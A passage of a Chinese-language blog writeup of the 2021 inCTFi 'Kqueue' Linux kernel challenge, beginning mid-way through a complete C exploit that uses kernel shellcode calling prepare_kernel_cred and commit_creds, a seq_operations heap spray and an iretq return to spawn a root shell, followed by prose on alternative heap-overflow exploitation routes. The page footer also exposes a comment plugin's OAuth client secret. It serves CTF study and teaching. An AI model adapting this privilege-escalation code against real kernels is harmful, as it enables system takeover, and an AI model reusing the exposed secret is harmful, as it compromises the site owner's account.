+<span class="token keyword">void</span> <span class="token function">save_kqueue</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> queue_idx<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> max_entries<span class="token punctuation">,</span> <span class="token class-name">uint16_t</span> data_size<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token class-name">request_t</span> req <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+		<span class="token punctuation">.</span>queue_idx  <span class="token operator">=</span> queue_idx<span class="token punctuation">,</span>
+		<span class="token punctuation">.</span>data_size <span class="token operator">=</span> data_size<span class="token punctuation">,</span>
+		<span class="token punctuation">.</span>max_entries <span class="token operator">=</span> max_entries<span class="token punctuation">,</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xB105BABE</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_rflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">save_stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span> <span class="token comment">//保护环境</span>
+	<span class="token keyword">asm</span><span class="token punctuation">(</span>
+		<span class="token string">"movq %%cs, %0;"</span>
+		<span class="token string">"movq %%ss, %1;"</span>
+		<span class="token string">"movq %%rsp, %2;"</span>
+		<span class="token string">"pushfq;"</span>
+		<span class="token string">"popq %3;"</span>
+		<span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span>
+		<span class="token operator">:</span>
+		<span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">shellcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">asm</span><span class="token punctuation">(</span>
+		<span class="token string">"movq 8(%%rsp), %%r12;"</span>
+		<span class="token string">"subq  $0x201179, %%r12;"</span> <span class="token comment">// kernel base</span>
+		<span class="token string">"movq %%r12, %%r13;"</span>
+		<span class="token string">"addq $0x8c580, %%r13;"</span> <span class="token comment">// prepare_kernel_cred</span>
+		<span class="token string">"addq $0x8c140, %%r12;"</span> <span class="token comment">// commit_cred</span>
+		<span class="token string">"xorq %%rdi, %%rdi;"</span>
+		<span class="token string">"call *%%r13;"</span>
+		<span class="token string">"movq %%rax, %%rdi;"</span>
+		<span class="token string">"call *%%r12;"</span>
+		<span class="token string">"pushq   %0;"</span>
+		<span class="token string">"pushq   %1;"</span>
+		<span class="token string">"pushq   %2;"</span>
+		<span class="token string">"pushq   %3;"</span>
+		<span class="token string">"pushq   $shell;"</span>
+		<span class="token string">"pushq   $0;"</span>
+		<span class="token string">"swapgs;"</span>
+		<span class="token string">"popq    %%rbp;"</span>
+		<span class="token string">"iretq;"</span> <span class="token operator">::</span><span class="token string">"m"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span>
+		<span class="token string">"m"</span><span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token class-name">uint64_t</span> data<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">int</span> seq_fds<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+	<span class="token function">save_stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"shellcode address = %#lx\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/kqueue"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open kqueue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token comment">// data[i] = (uint64_t) 0xdeeabeefdeadbeef;</span>
+		data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>shellcode<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token function">create_kqueue</span><span class="token punctuation">(</span><span class="token number">0xffffffff</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">edit_kqueue</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x200</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		seq_fds<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token function">save_kqueue</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x200</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token function">read</span><span class="token punctuation">(</span>seq_fds<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>如果要考虑参数检查，就当这个参数检查是有效的情况下，利用方式也很相似</p>
+<ol>
+<li>create，queue1，data_size=0x20</li>
+<li>create，queue2，max_entries=0xffffffff，queue_size=0x18，data_size=0x20，要求 queue2 后面紧跟的位置就是 queue1-&gt;data 或者 queue1_entries-&gt;data 的位置</li>
+<li>edit queue1，修改 queue1某个data，刚好是 queue2 的第一个 entries，那么就可以伪造一个 queue_entry，data为许多 shellcode 指针</li>
+<li>堆喷射 file_operations</li>
+<li>save queue2，传递参数 max_entries=1，因为 queue2-&gt;max_entries 为 0xffffffff，所以检查是可以通过的，因为第一个 entry 已经伪造好了，data 指向许多 shellcode 指针，堆越界的时候有可能覆盖到 seq_operations 里，从而劫持程序执行流，后续操作就一样了</li>
+</ol>
+<p>这个思路是 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://bbs.pediy.com/thread-269031.htm">ScUpax0s师傅的 writeup 里的</a> </p>
+<p>具体操作起来，第一第二步可能会复杂一点，具体描述和 ScUpax0s 师傅的 writeup 有点不一样，大概是这个意思就行</p>
+<p>详细 exp 我就不再重复了，可以参考 ScUpax0s 师傅的 writeup</p>
+<h3 id="方法三？"><a href="#方法三？" class="headerlink" title="方法三？"></a>方法三？</h3><p>在前面的分析中，堆溢出的主要原因是 <em>参数检查里面只检查了 <code>request.data_size</code> 是否超过 <code>queue-&gt;queue_size</code> 而不是 <code>queue-&gt;data_size</code></em></p>
+<p>所以 create 的加法溢出并不会对这个堆溢出有多大的影响，只是因为有这个洞的存在，使得 <code>new_queue</code> 分配的大小是 0x18，其相邻位置有概率是 0x20 大小的 seq_operations 结构体，方便了利用</p>
+<p>在这里提供一个堆溢出的想法：</p>
+<ol>
+<li>正常的 create ，比如 max_entries=1，data_size=0x20，那么 queue_size 为 <code>0x18 * (1 + 1) + 0x18</code> 即 0x48</li>
+<li>save，request-&gt;max_entries=1，request-&gt;data_size=0x30，因为 queue_size 为 0x48，通过检查</li>
+<li>memcpy 的时候，写入了 <code>0x30 * 2</code> 即  0x60 的数据，堆同样溢出了</li>
+</ol>
+<p>通过控制 queue_size，可以控制 new_queue 堆内存的大小，再通过控制 edit，还有 save 时 request-&gt;max_entries，request-&gt;data_size，可以控制 new_queue 溢出的内容和长度</p>
+<p>需要的就是一个合适的结构体了，初步判断 tty_struct 不太行，因为 tty_struct 的 ops 字段之前还有一些比较重要的数据不能覆盖，而 ops 字段那个结构体在源码中也没找到在哪分配的，好像是固定的静态字段，官方 writeup 说的是堆喷 tty_struct，但 exp 确实 seq_operations 没懂啥情况</p>
+<p>才疏学浅，没想到能有哪些结构体能劫持一下，往后学习再看看</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9AInCTF2021-Kqueue">https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9AInCTF2021-Kqueue</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://bbs.pediy.com/thread-269031.htm">https://bbs.pediy.com/thread-269031.htm</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.bi0s.in/2021/08/17/Pwn/InCTFi21-Kqueue/">https://blog.bi0s.in/2021/08/17/Pwn/InCTFi21-Kqueue/</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>原作者： </strong>feather
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://www.xi4oyu.top/f6f424b7/" title="2021-inCTFi-Kqueue">http://www.xi4oyu.top/f6f424b7/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/a50bb9a6/" rel="prev" title="2021-inCTF-DeadlyFastGraph">
+                  <i class="fa fa-chevron-left"></i> 2021-inCTF-DeadlyFastGraph
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/5b4f46e3/" rel="next" title="2021-0CTF-FINAL-kernote">
+                  2021-0CTF-FINAL-kernote <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">feather</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">369k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">5:36</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"featherl","repo":"BlogComment","client_id":"675720f495795eee8627","client_secret":"969c2822176976bcb997f7d6fd07767ce6356043","admin_user":"featherl","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"b8c601713a371924a82b8be7044395da"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
